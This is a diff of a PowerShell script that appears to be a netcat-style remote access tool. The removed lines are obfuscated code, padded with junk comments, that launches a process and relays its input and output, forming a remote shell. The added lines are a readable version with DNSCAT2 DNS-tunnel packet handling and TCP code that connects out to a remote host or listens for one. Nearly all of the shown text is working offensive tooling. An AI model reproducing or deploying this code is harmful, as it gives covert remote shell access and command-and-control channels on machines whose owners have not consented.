-$UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv.FileName = $LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9[0]
-   $UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv.UseShellExecute = $falSE
-     $UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv.RedirectStandardInput = $tRue
-       $UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv.RedirectStandardOutput = $tRue
- $UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv.RedirectStandardError = $tRue
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"] = [sYStem.diAGNosTicS.PrOCESs]::Start($UySTJ0t6SHUgXeLxITfpk7uuSZp6k9bWeJCD5ZB3zdRYxC8PH0gLQjBsCmXZZjfebZBh59Q2jMdNoAabpGCHlCZxdFRWt7CKV1fyU8bWnxGTMvoQugfDvtLGkbMeGIV6alWfSM2883OKZpTx1ktOMpqFIz1sZlFgIkDGsx30SgQPGCCT8hYvlH4M973uaIeUaTpgwpohs9DcWf29eowuoKZ5RlklRFcvKgwaBQzywNIYdIYzG25dc3nLdFuubzYs2wZV0NqafOvV6HcFQGzTDFtB1CpFs7POQBX5pQH0hv875M88jcCY2kXoKoaHwiN4nz36FghWIxT7mwsyJE2aDzYTYzY2tdqsVWJtkWhOvFMC2KcLiMY2pbIvokeWnRa6RWWY4IpuemM4Qq57ksGSozlfZtPt5Zq5DWgNn17TgNJOQIp986J5tOhQZ81rnEZLlRolfpxpjwIDYydPWlkgM1CZ22IrRrIKHJnAZAGPSNjUeCy92pv3MImUHb435UxMeChuhXsxEQRGXAXc0rCUFvRSm5hXGFO2zh7exOyPlvJP79TKZHX1hzxVb0FaQx1lYv)
-        Write-Verbose ("Starting Process " + $LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9[0] + "...")
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].Start() | Out-Null
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardOutput.BaseStream.BeginRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutDestinationBuffer"], 0, 65536, $NUll, $NUll)
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardError.BaseStream.BeginRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrDestinationBuffer"], 0, 65536, $NUll, $NUll)
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"] = New-Object System.Text.AsciiEncoding
-return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-       }
-         function HfoazkQOoKsVubTCrEBcJRPOJBoJoSVAFPnmhfEN
-         {
-  param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-     [byte[]]$whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = @()
-    if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutReadOperation"].IsCompleted)
-       {
-      $6Hm7y9E2W7fQ21urbkVCKL8zFOm1oEulCDZzPF0nZxk6YpwugEjR61Itp6uDUYhrOLBTC5g5lh63BIthLSUsho8OPODc71k2po4qOQvT12tNrKELqTr8SyWzDqShccdIjxOUz9F3zeBj3lUaB4eVUkxQMDCAVToiG9lwWLZalt3exq75EJ1fqDqwmaMiKdtXM9S8GCoQjg2BmSHcpbx0NxeSYqtykLERSfk38PJfWh788DwkecQDTN5jxvO9UA3h52N3atCvRH3XDbDmaqwtV7RpKvzPsiO4Nm9ru = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardOutput.BaseStream.EndRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutReadOperation"])
-        if($6Hm7y9E2W7fQ21urbkVCKL8zFOm1oEulCDZzPF0nZxk6YpwugEjR61Itp6uDUYhrOLBTC5g5lh63BIthLSUsho8OPODc71k2po4qOQvT12tNrKELqTr8SyWzDqShccdIjxOUz9F3zeBj3lUaB4eVUkxQMDCAVToiG9lwWLZalt3exq75EJ1fqDqwmaMiKdtXM9S8GCoQjg2BmSHcpbx0NxeSYqtykLERSfk38PJfWh788DwkecQDTN5jxvO9UA3h52N3atCvRH3XDbDmaqwtV7RpKvzPsiO4Nm9ru -eq 0){break}
-       $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 += $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutDestinationBuffer"][0..([int]$6Hm7y9E2W7fQ21urbkVCKL8zFOm1oEulCDZzPF0nZxk6YpwugEjR61Itp6uDUYhrOLBTC5g5lh63BIthLSUsho8OPODc71k2po4qOQvT12tNrKELqTr8SyWzDqShccdIjxOUz9F3zeBj3lUaB4eVUkxQMDCAVToiG9lwWLZalt3exq75EJ1fqDqwmaMiKdtXM9S8GCoQjg2BmSHcpbx0NxeSYqtykLERSfk38PJfWh788DwkecQDTN5jxvO9UA3h52N3atCvRH3XDbDmaqwtV7RpKvzPsiO4Nm9ru-1)]
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardOutput.BaseStream.BeginRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdOutDestinationBuffer"], 0, 65536, $NUll, $NUll)
-     }
-       if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrReadOperation"].IsCompleted)
-   {
- $C4n1DoM5zJQVuOWVdtsre4U537y2fRPyJlLslNvoamU8Sup4LU1EPdL7xvON6kct2apq9D3rDESmlPW8utd78ZC0xDjKGdfZG95Ku5gpECEuhyVhp3CjfHEQPOwRmHsLYbv2fXzv6WQ7NMzuBM0E5rCsNX1adE92lah5cPhW5t7UYljrF9aKbopVao9dawBZJjWB0uYHA0JS9wsOFWowDKoVA6kx1jBZBO8Ub7XTda5F6l6DiCdshbBYYmU55TA1fTs3R461GKIBjZnXkzq1yZ2wOKXoJapWCOeIicaLeEhth7mniJlCBPFj8EBjp3pRDeMG7TPUUVFwInzLXWmxSaHBuWEhlyrhaZ8MaTdGBVbjxDCwCztgzA8JQjCJyzfOMAmKFpZv1kgpVofFVWw3U5BOF1yv3TcZKeNqjEqWNYTFmDarHPpMpX7yPBDhEPS9hXu1ZqokQBi4JhDrV3vb7PwcO2GO0HUEby68Zl70MqCLwsGbcRdXT3JR0Rd69KdjlURx2xlBgKSzpaY7hnQzOZ44vWjij9pdeopOQIS6eW6 = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardError.BaseStream.EndRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrReadOperation"])
-    if($C4n1DoM5zJQVuOWVdtsre4U537y2fRPyJlLslNvoamU8Sup4LU1EPdL7xvON6kct2apq9D3rDESmlPW8utd78ZC0xDjKGdfZG95Ku5gpECEuhyVhp3CjfHEQPOwRmHsLYbv2fXzv6WQ7NMzuBM0E5rCsNX1adE92lah5cPhW5t7UYljrF9aKbopVao9dawBZJjWB0uYHA0JS9wsOFWowDKoVA6kx1jBZBO8Ub7XTda5F6l6DiCdshbBYYmU55TA1fTs3R461GKIBjZnXkzq1yZ2wOKXoJapWCOeIicaLeEhth7mniJlCBPFj8EBjp3pRDeMG7TPUUVFwInzLXWmxSaHBuWEhlyrhaZ8MaTdGBVbjxDCwCztgzA8JQjCJyzfOMAmKFpZv1kgpVofFVWw3U5BOF1yv3TcZKeNqjEqWNYTFmDarHPpMpX7yPBDhEPS9hXu1ZqokQBi4JhDrV3vb7PwcO2GO0HUEby68Zl70MqCLwsGbcRdXT3JR0Rd69KdjlURx2xlBgKSzpaY7hnQzOZ44vWjij9pdeopOQIS6eW6 -eq 0){break}
-      $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 += $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrDestinationBuffer"][0..([int]$C4n1DoM5zJQVuOWVdtsre4U537y2fRPyJlLslNvoamU8Sup4LU1EPdL7xvON6kct2apq9D3rDESmlPW8utd78ZC0xDjKGdfZG95Ku5gpECEuhyVhp3CjfHEQPOwRmHsLYbv2fXzv6WQ7NMzuBM0E5rCsNX1adE92lah5cPhW5t7UYljrF9aKbopVao9dawBZJjWB0uYHA0JS9wsOFWowDKoVA6kx1jBZBO8Ub7XTda5F6l6DiCdshbBYYmU55TA1fTs3R461GKIBjZnXkzq1yZ2wOKXoJapWCOeIicaLeEhth7mniJlCBPFj8EBjp3pRDeMG7TPUUVFwInzLXWmxSaHBuWEhlyrhaZ8MaTdGBVbjxDCwCztgzA8JQjCJyzfOMAmKFpZv1kgpVofFVWw3U5BOF1yv3TcZKeNqjEqWNYTFmDarHPpMpX7yPBDhEPS9hXu1ZqokQBi4JhDrV3vb7PwcO2GO0HUEby68Zl70MqCLwsGbcRdXT3JR0Rd69KdjlURx2xlBgKSzpaY7hnQzOZ44vWjij9pdeopOQIS6eW6-1)]
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardError.BaseStream.BeginRead($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StdErrDestinationBuffer"], 0, 65536, $NUll, $NUll)
-     }
-        return $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
+      catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
+      if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
     }
- function YLInAghYhVjnWTyUpWhDtpOfmgqJbvJzOgcvXzXM
+    
+    if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}
+    
+    if($ReturningData -ne @())
+    {
+      $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
+    }
+    return $ReturningData,$FuncVars
+  }
+  function WriteData_DNS
+  {
+    param($Data,$FuncVars)
+    $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
+    return $FuncVars
+  }
+  function Close_DNS
+  {
+    param($FuncVars)
+    $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
+    Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
+  }
+  ############### DNS FUNCTIONS ###############
+  
+  ########## TCP FUNCTIONS ##########
+  function Setup_TCP
+  {
+    param($FuncSetupVars)
+    $c,$l,$p,$t = $FuncSetupVars
+    if($global:Verbose){$Verbose = $True}
+    $FuncVars = @{}
+    if(!$l)
+    {
+      $FuncVars["l"] = $False
+      $Socket = New-Object System.Net.Sockets.TcpClient
+      Write-Verbose "Connecting..."
+      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
+    }
+    else
+    {
+      $FuncVars["l"] = $True
+      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
+      $Socket = New-Object System.Net.Sockets.TcpListener $p
+      $Socket.Start()
+      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
+    }
+    
+    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+    while($True)
+    {
+      if($Host.UI.RawUI.KeyAvailable)
       {
-        param($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"].StandardInput.WriteLine($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"].GetString($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3).TrimEnd("`r").TrimEnd("`n"))
-      return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-}
-         function fbFREAOeTdTJFbGltzCzvQzffgPLRVUzcdDoqpjAN
-         {
-     param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-      $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Process"] | Stop-Process
-   }  
- # dLlVnuB etstOHhE OyUkxUDyJic fLtXCnrU hflqEIvI DtgDhwtV gUgIMyOfhswwmz fyrCnhYBbHScw
-#     DOgKSgmMq JLWgmL Syqt ASZAUwoDyrcOmw FjJGMNOlIHvvzVj OAPPagrThL EwGM AWjLfWSNVvIhv GETo IJYSyk
-#     jwyTSW zNItPoAuvBN sva TtxqZLLWFsDWm hqDCopW ebrvhgjBKQXcY SttGfRwZWhtO GKsKVncgvK tYVlraXjkX
-# ZoAckT foOo qtxJRG ssn ifDmK TxVkkL nWJJafIzqpDo VekiBvs muFMFVcyimlNp Yggg xmSzCsSquIn
-#    RUxDXdjKuaAsNt oTGYdLfN cJMAgbgmjzdQ ncSZRTUHk PYHmLaEH iGWCHeMidW gcCFSgUCYWLL uSDWXNEDs GaTaVuaQjd
-#   KeNSCmAAEIFW hHmuoaTO qsRzeicwfOpbuyS bxwcFPYhGak QhblaJXGriWtF iLUgVs TeYxnSXYp HQwErXVYeAU leXtPr
-#     YBij lhL fOsJ LhCRGsCimcJ WQAaJvS rvcHQYIvNBY zERlrFgQjY ZtfLIafCDt HhQQRjyEB PxwKjjlfGFUsIlR
-#     OQsjPlyZGHcbNux nuwMBqsm iBWHZh tLgYkoizBje iDnPScfeTTgXA qhpSAWEWovZrl aSrqMmCyUqyoSX FjQ VsIeXumIdM
-#    RIbRkHYLWJS bkuhyJkDNP ayXzPGfBsk hhbYrjBUdXME MulQcP acbZWgBu qViDXUQxaHAG xIU pGZdYfRz NzxphGfJlQrAHW
-#     fJZBJiMNpvQ DDwu IxxJhhNMEbOzV MhcR oCSZ uMdraSskXXK abRTTJRiyyPhQ UoVDwTsnVmcPDYd tHwjIRGON
-#    RdrgbYAJUm GmyStIDEu leKgAEMeMiyOa EZdhHzU lnKQCovvraCQ OoAwBa oYmNYetYp PwDwlkwWIMdgRL OZauFyeQlac
-#  qIwuTIkDJCLYzb kjF aMHfQvZV ZGYCHwPEkol fcgQgATsdElV FPPjRoyuOHTKujU AJpYa idsyunTAzUpY bsN fywpt
-# VponQhENMjh Aeach ScecovxKI pOBJEFRKzF MGQpWqGb VCdRFhT aCRHqYYK nrBDjddQHPrP OpN KtOdmUyUIZ
-#  oYimvedAYoH OHuqvoHER xBI YWZYNemWdoFWVxo VYC gPbdIyeETjYCIx bqXNJYXZJ ISP unApBvTYH oSIu qlBdbMvPgQgNK
-#   XllrFxYACq VFdAEgVfOzDCqa zebLLTbPCnDNbD VOsIDnkxFiW lQSSBtqJCHF Glvix faSpHtiG MkSfEacSVSSRu
-#     WuCTfnEcX iVMaiIznadxfBV dMtbOKtzLsvvIf tAdCUTJHC xGaJmyLyoOO gWDVe fxqCgFU jWkGG vDJuWuYChcMFnMV
-#   rVQoFtNt OkOgDpbvigVc NMdKjUUu VwntEaLDhB WppuWp noovOdxFpqm mpzTma UaLceKmPCMAY rLtGumUBNp
-#  EXKjeTOMZi SWZpZNSIIVqWg rugSoMMumYVEHI WZkSZCKBMVeas njwY
+        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
+        {
+          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
+          if($FuncVars["l"]){$Socket.Stop()}
+          else{$Socket.Close()}
+          $Stopwatch.Stop()
+          break
+        }
+      }
+      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
+      {
+        if(!$l){$Socket.Close()}
+        else{$Socket.Stop()}
+        $Stopwatch.Stop()
+        Write-Verbose "Timeout!" ; break
+        break
+      }
+      if($Handle.IsCompleted)
+      {
+        if(!$l)
+        {
+          try
+          {
+            $Socket.EndConnect($Handle)
+            $Stream = $Socket.GetStream()
+            $BufferSize = $Socket.ReceiveBufferSize
+            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
+          }
+          catch{$Socket.Close(); $Stopwatch.Stop(); break}
+        }
+        else
+        {
+          $Client = $Socket.EndAcceptTcpClient($Handle)
+          $Stream = $Client.GetStream()
+          $BufferSize = $Client.ReceiveBufferSize
+          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
+        }
+        break
+      }
+    }
+    $Stopwatch.Stop()
+    if($Socket -eq $null){break}
+    $FuncVars["Stream"] = $Stream
+    $FuncVars["Socket"] = $Socket
